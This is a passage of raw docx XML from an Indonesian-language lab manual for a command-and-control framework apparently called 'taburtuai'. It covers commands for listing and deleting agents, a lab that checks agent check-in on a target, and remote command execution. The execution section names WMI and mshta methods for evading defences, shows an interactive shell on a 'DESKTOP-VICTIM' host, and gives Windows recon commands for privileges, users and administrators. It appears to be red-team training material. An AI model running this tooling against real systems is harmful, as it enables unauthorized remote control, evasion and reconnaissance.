            <w:tcW w:type="dxa" w:w="5386"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Detail lengkap satu agent</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3118"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>agents delete &lt;id&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5386"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Hapus agent dari database</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3118"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>queue clear &lt;id&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5386"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Hapus semua perintah pending di antrian</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3118"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>queue stats</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5386"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Statistik antrian (pending/running/done)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="100"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:i/>
          <w:color w:val="555555"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>ℹ  Agent ID bisa disingkat menjadi 8 karakter pertama. Misalnya '7d019eb7' untuk agent '7d019eb7-b1ae-4c90-9b8e-e860ba07f889'.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="240" w:after="80"/>
        <w:shd w:val="clear" w:color="auto" w:fill="C0392B"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">  LAB 4.1  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">  Verifikasi Agent Check-in</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">Step 1:  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="141414"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Pastikan server berjalan dan agent sudah dieksekusi di target.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">Step 2:  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="141414"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Buka console operator.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>./bin/operator console --server http://&lt;IP_SERVER&gt;:8080</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List agents dan verifikasi agent muncul.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>agents list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Lihat detail agent.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>agents info &lt;agent-id&gt;</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Catat Agent ID untuk digunakan pada lab-lab berikutnya.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="360" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="32"/>
        </w:rPr>
        <w:t>BAGIAN 5 — COMMAND EXECUTION</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="8" w:space="1" w:color="C0392B"/>
        </w:pBdr>
        <w:spacing w:before="0" w:after="80"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:i w:val="0"/>
          <w:color w:val="141414"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Command execution adalah fungsi paling dasar C2. Operator mengirim perintah shell yang dieksekusi oleh agent di target, dan hasilnya dikembalikan ke server.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="280" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>Shell Command Dasar</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># Eksekusi perintah (via cmd.exe secara default)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>cmd &lt;agent-id&gt; "whoami /priv"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>cmd &lt;agent-id&gt; "ipconfig /all"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>cmd &lt;agent-id&gt; "net user"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>cmd &lt;agent-id&gt; "net localgroup administrators"</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Via PowerShell</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>cmd &lt;agent-id&gt; "Get-Process" --method powershell</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Dengan working directory berbeda</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>cmd &lt;agent-id&gt; "dir" --dir "C:\Users\john.doe\Documents"</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Dengan timeout (detik)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>cmd &lt;agent-id&gt; "ping -n 100 8.8.8.8" --timeout 120</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Tunggu hasil sebelum lanjut (blocking)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>cmd &lt;agent-id&gt; "whoami" --wait</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="280" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>Metode Eksekusi</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="TableGrid"/>
        <w:tblW w:type="auto" w:w="0"/>
        <w:tblLook w:firstColumn="1" w:firstRow="1" w:lastColumn="0" w:lastRow="0" w:noHBand="0" w:noVBand="1" w:val="04A0"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3025"/>
        <w:gridCol w:w="3025"/>
        <w:gridCol w:w="3025"/>
      </w:tblGrid>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F1F1F"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Method</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3118"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F1F1F"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Deskripsi</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3685"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F1F1F"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Kapan Digunakan</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>cmd (default)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3118"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>cmd.exe /c &lt;command&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3685"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Perintah umum, batch</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>powershell</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3118"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>powershell.exe -Command &lt;command&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3685"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>PS cmdlets, .NET access</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>wmi</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3118"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>WMI process create via wmic.exe</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3685"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Bypass shell restrictions</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>mshta</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3118"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>mshta.exe vbscript:...</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3685"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>LOLBin evasion</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>direct</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3118"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Exec langsung tanpa shell wrapper</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3685"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Binary execution</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="280" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>Interactive Shell</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:i w:val="0"/>
          <w:color w:val="141414"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Shell interaktif memungkinkan operator berinteraksi real-time dengan target layaknya remote shell, dengan support untuk perintah yang membutuhkan input atau multiple command berurutan.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># Buka interactive shell</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>shell &lt;agent-id&gt;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Di dalam shell:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># taburtuai-shell(DESKTOP-VICTIM) &gt; whoami</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># CORP\john.doe</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># taburtuai-shell(DESKTOP-VICTIM) &gt; cd C:\Users</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># taburtuai-shell(DESKTOP-VICTIM) &gt; dir</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># ...</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># taburtuai-shell(DESKTOP-VICTIM) &gt; exit</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="280" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>Perintah Recon Dasar via Shell</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># Identifikasi sistem</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>cmd &lt;id&gt; "systeminfo | findstr /B /C:'OS Name' /C:'OS Version' /C:'Domain'"</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Cek privileges</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>cmd &lt;id&gt; "whoami /priv"</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Cek user dan grup</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
